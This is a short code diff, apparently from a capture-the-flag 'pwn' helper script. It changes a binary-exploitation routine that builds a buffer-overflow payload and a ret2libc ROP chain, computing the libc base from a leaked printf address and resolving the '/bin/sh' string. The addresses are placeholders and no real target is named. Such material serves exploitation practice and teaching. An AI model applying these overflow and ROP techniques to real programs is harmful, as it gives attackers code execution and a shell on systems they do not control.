@@ -247,9 +247,16 @@ define function pwn_challenges()
     let ret_addr = 0xdeadbeef
     let payload = overflow_payload(offset, ret_addr, "shellcode")
     
-    # Step 4: ROP chain
-    let libc_base = 0x7ffff7a0d000
-    let binsh = libc_base + 0x1b3e1a
+    # Step 4: ROP chain with dynamic address resolution
+    # Assume we leaked a libc function address first
+    let leaked_addr = 0x7ffff7a60f70  # Example leaked address
+    let libc_template = Libc("ubuntu20.04")
+    let leaked_func_offset = libc_template["symbols"]["printf"]
+    let libc_base = leaked_addr - leaked_func_offset
+    
+    # Resolve addresses dynamically
+    let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+    let binsh = libc_resolved["strings"]["bin_sh"]
     let rop = ret2libc(libc_base, binsh)
     
     # Step 5: Execute
